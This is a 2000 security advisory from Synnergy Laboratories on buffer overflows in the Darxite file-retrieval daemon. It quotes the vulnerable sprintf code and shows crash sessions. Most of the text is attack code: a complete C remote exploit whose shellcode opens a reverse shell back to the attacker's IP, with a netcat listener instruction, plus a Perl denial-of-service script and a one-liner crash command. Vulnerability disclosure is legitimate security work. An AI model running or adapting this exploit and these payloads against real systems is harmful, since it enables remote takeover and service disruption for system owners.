@@ -1,0 +1,368 @@
+
+        Synnergy Laboratories Advisory SLA-2000-8
+
+NAME
+
+       Darxite daemon login authentication buffer overflow
+
+
+AFFECTED
+ 
+  Linux 2.x
+
+
+SYNOPSIS
+
+  Synnergy Labs has discovered a remote buffer overflow in the login authentication
+  of Debian's 3rd party software, Darxite, that allows a remote user to execute
+  commands on the server running this daemon.
+
+
+DESCRIPTION
+
+  "Darxite" is a daemon, written by Ashley Montanaro, whose job is to retrieve files via
+  FTP or HTTP and execute other FTP commands, and a number of "client" programs whose 
+  jobs are to control the daemon. Debian employs this software as part of it's third party
+  applications.
+
+  Platform  ->    Linux 2.X
+  Vendor    ->    http://darxite.sourceforge.net
+
+  1. This is a very simple problem. Vulnerability exist in a number of places throughout
+  the code, allowing a local/remote user to send more than the predefined buffer causing
+  the server to crash, and process die. Daemon does not leave a coredump of the memory image
+  since it uses a `case SIGSEGV: ..` but nevertheless the program will crash.
+
+  2. Now there is also a passwd authentication remote overflow, allowing remote shell access
+  as the uid of the darxite daemon.
+
+  From Library/sockets.c
+
+        char buffer[256];
+              ..
+        sprintf(buffer, "%s\n", name);
+              ..
+        sprintf(buffer, "%s\n, password);
+
+  As you can see, specifying more than 256 bytes will cause a stack overflow.
+
+  Below is some of the offending code causing a remote DoS.
+
+  For local users specifying the -f <file> for `darxcmd` will force the client
+  to read in an arbitary config file into a buffer of limit 4096.
+  Upon connection to the server, darxcmd will crash by specifying any of the
+  below parameters.
+
+  From daemon/http.c
+
+    if (strcmp(DX_ProxyHostName, "") && (DX_ProxyPort > 0))
+    {
+        sprintf(get_string, "GET %s://%s%s HTTP/1.0", file->Protocol,
+                file->ActualServer->Name, file->Path);
+    }
+    else
+    {
+        sprintf(get_string, "GET %s HTTP/1.0", file->Path);
+    }
+    sprintf(buffer,
+            "%s\r\n"
+            "Host: %s\r\n"
+            "User-Agent: Darxite/%s\r\n"
+            "%s\r\n",
+            get_string, file->ActualServer->Name, RELEASE_VER, range);
+
+            sprintf(buffer, "\"%s://%s%s\" | \"%s\" | %s | %s | %s | %d",
+                    file->Protocol, file->Server->Name, file->Path,
+                    file->LocalPath, file->LogIn, file->Password,
+                    file->Flags, total_size);
+
+  Likewise in daemon/ftp.c
+
+     char get_buffer[256];
+           ..
+     sprintf(get_buffer, "%s://%s%s/%s | %s/%s | %s | "
+             "%s | %s | %s", file->Protocol,
+             file->ActualServer->Name, path_buffer,
+                                line_ptr, local_path, line_ptr,
+                                file->LogIn, file->Password, new_flags,
+                                size);
+
+  .. and daemon/files.c
+
+        char line_buffer[1024];
+                ..
+            sprintf(line_buffer, "\"%s://%s%s\" | \"%s\" | %s | %s | %s | "
+                    "%d\n", new_file->Protocol, server->Name,
+                    new_file->Path, new_file->LocalPath,
+                    new_file->LogIn, new_file->Password,
+                    new_file->Flags, new_file->TotalSize);
+
+
+  /* list goes on.. */
+
+  Note: by default installation of Darxide the password is blank !
+
+  Example 1.
+
+  [ syn:/home/deth ]$ telnet localhost 69
+
+  Trying 127.0.0.1...
+  Connected to localhost.
+  Escape character is '^]'.
+  900 Welcome to Darxite 0.4. Enter your password.
+  <enter>
+  900 Password OK; tell me your name.
+  any-name-will-do
+  900 "any-name-will-do" connected OK.
+  Get [buffer exceeding 1024 chars]
+  DX: Segment violation. Lots of features mean lots of bugs.
+  Connection closed by foreign host.
+
+  [ syn:/home/deth ]$
+
+  /* Server has crashed and process killed */
+
+  We could also do something like:
+
+  [ syn:/home/deth ]$ darxget -clocalhost:2000 -o- `perl -e 'print "A"x1024'`
+  Enter Passsword for daemon on localhost:
+  <enter>
+
+  /* Now checking the daemon logs */
+
+  DX. Segmentation violation.
+  Connection closed by foreign host.
+
+  Pretty easy eh? ;)
+
+  Example 2:
+
+  Scrippie has provided a working demonstration exploit, as seen below.
+
+
+EXPLOIT
+
+/*
+   Darxite Daemon v0.4 password authentication overflow
+   ----------------------------------------------------
+
+   I tried to use some easy functions for string creation, and they seem to
+   work pretty quick (no more hours of frustration writing for loops :).
+
+   As always I used my own shellcode, you should do a "nc -l -p 27002" on the
+   machine you fill in as "your IP" and execute this - if it works you'll have
+   a shell in the netcat session.
+
+
+   -- Scrippie/ronald@grafix.nl
+*/
+
+/* Synnergy.net 2000 (c) */
+
+#include <stdio.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define DARX_BUF        1024
+#define NUM_NOPS        1000
+
+int xconnect(unsigned long, unsigned int);
+void readBanner(int socket);
+char *strcreat(char *, char *, int);
+char *stralign(char *, int);
+char *longToChar(unsigned long);
+
+char hellcode[]= 
+        "\xeb\x7a\x5e\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x8d\x4e"
+        "\x1c\xb2\x01\x89\x56\x20\xb2\x06\x89\x56\x24\xb2\x02\x89\x56"
+        "\x1c\xcd\x80\x89\x46\x18\x89\x16\x66\xc7\x46\x02\x69\x7a\x89"
+        "\x46\x1c\x8d\x06\x89\x46\x20\x80\xc2\x0e\x89\x56\x24\x31\xc0"
+        "\x04\x66\x80\xc3\x02\x8d\x4e\x1c\xcd\x80\x31\xc0\x04\x3f\x89"
+        "\xc2\x8b\x5e\x18\x31\xc9\xcd\x80\x89\xd0\x41\xcd\x80\x89\xd0"
+        "\x41\xcd\x80\x31\xc0\x8d\x7e\x0f\x80\xc1\x07\xf3\xaa\x04\x0b"
+        "\x8d\x5e\x08\x89\x5e\x10\x8d\x4e\x10\x31\xd2\xcd\x80\x31\xc0"
+        "\xfe\xc0\xcd\x80\xe8\x81\xff\xff\xff\x41\x41\x42\x42\xBB\xBB"
+        "\xBB\xBB\x2f\x62\x69\x6e\x2f\x73\x68";
+
+int main(int argc, char **argv)
+{
+   int sd;
+   unsigned int align=0;
+   unsigned long sip, retaddy=0xbffff928;
+   char *iploc, *evilstring;
+
+   if(argc < 4) {
+      printf("Use as: %s <target IP> <target port> <your ip> [ret addy] [align]
+         \n", argv[0]);
+      exit(0);
+   }
+
+   if((sip = inet_addr(argv[3])) == -1) {
+      perror("inet_addr()");
+      exit(-1);
+   }
+
+   if(argc > 4) retaddy = strtoul(argv[4], NULL, 16);
+   if(argc > 5) align = atoi(argv[5]);
+
+   printf("Using return address: 0x%lx\n", retaddy);
+   printf("Using alignment: %d\n", align);
+
+   /* Locate the IP position in the shellcode */
+   iploc=(char *)strchr(hellcode, 0xBB);
+   memcpy((void *) iploc, (void *) &sip, 4);
+
+   /* Generate the overflow string */
+
+   evilstring = strcreat(NULL, "A", align);
+      /* We memory leak 5 bytes here, don't make a service out of this :) */
+   evilstring = strcreat(evilstring, longToChar(retaddy), (DARX_BUF+8)>>2);
+   evilstring = strcreat(evilstring, "\x90", NUM_NOPS);
+   evilstring = strcreat(evilstring, hellcode, 1);
+
+   sd = xconnect(inet_addr(argv[1]), atoi(argv[2]));
+
+   printf("Connected... Now sending overflow...\n");
+
+   send(sd, evilstring, strlen(evilstring)+1, 0);
+
+   free(evilstring);
+   return(0);
+}
+
+/*
+   Returns the socket descriptor to "ip" on "port"
+*/
+
+int xconnect(unsigned long ip, unsigned int port)
+{
+   struct sockaddr_in sa;       /* Sockaddr */
+   int sd;                      /* Socket Descriptor */
+
+   if((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+      perror("socket()");
+      exit(-1);
+   }
+
+   memset(&sa, 0x00, sizeof(struct sockaddr_in));
+   sa.sin_port=htons(port);
+   sa.sin_addr.s_addr=ip;
+
+   if(connect(sd, &sa, sizeof(struct sockaddr_in)) == -1) {
+      perror("connect()");
+      exit(-1);
+   }
+
+   return(sd);
+}
+
+/*
+   Yummy yummy function for easy string creation
+*/
+
+char *strcreat(char *dest, char *pattern, int repeat)
+{
+   char *ret;
+   size_t plen, dlen=0;
+   int i;
+
+   if(dest) dlen = strlen(dest);
+   plen = strlen(pattern);
+
+   ret = (char *)realloc(dest, dlen+repeat*plen+1);
+
+   for(i=0;i<repeat;i++) {
+      strcat(ret, pattern);
+   }
+   return(ret);
+}
+
+/*
+   Converts a long to an array containing this long
+*/
+
+char *longToChar(unsigned long blaat)
+{
+   unsigned int i;
+   char *ret;
+
+   ret = (char *)malloc(sizeof(long)+1);
+
+   for(i=0;i<sizeof(long);i++) {
+      ret[i] = (blaat >> (i<<3)) & 0xff;
+   }
+   ret[sizeof(long)] = 0x00;
+
+   return(ret);
+}
+
+
+----------------------------------------------
+
+  Proof of concept DoS code below.
+
+  =================<cut>==================
+
+  #!/usr/bin/perl
+  # lame DoS 
+  #
+  use Getopt::Std;
+  use Socket;
+  getopt('s:p', \%args);
+  if(!defined($args{s}) && !defined($args{p})){&usage;}
+  $serv = $args{s};
+  $port = $args{p};
+  $foo = "A";
+  $bar = 1024;
+  $foobar .= $foo x $bar; 
+
+  $in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
+  $paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
+  $proto = getprotobyname('tcp') || die("Error: $!\n");
+
+  socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
+  connect(S, $paddr) || die("Error: $!\n");
+  select(S); $| = 1; select(STDOUT);
+
+  $res=<S>; print "$res\n";
+  sleep 1;
+  print S "\r\n";
+  $res=<S>; print "$res\n";
+  sleep 1;
+  print S "guest\n";
+  $res=<S>; print "$res\n";
+  sleep 1;
+  print S $foobar || die("Error: $!\n");
+  close(S);
+
+  print("killed Darxite successfully. Feeling better now?\n");
+
+  sub usage {die("\n\n$0 -s <server> -p <port>\n\n");} 
+
+  =================</cut>==================
+ 
+
+SOLUTION
+
+  Wait until the next patched version of Darxite comes out, or even changed the 
+  code yourself if this program is that important to you. (snprintf() isn't the 
+  hardest thing.)
+
+
+AUTHOR
+
+  dethy @ synnergy.net
+  scrippie @ synnergy.net
+
+DISCLAIMER
+
+  Synnergy Laboratories may not be held liable for the use or potential effects of 
+  these programs or advisories, nor the content contained within. Use them at your 
+  own risk.
+
+COPYRIGHT
+
+        Synnergy Laboratories -  www.synnergy.net (c) 1998-2000 
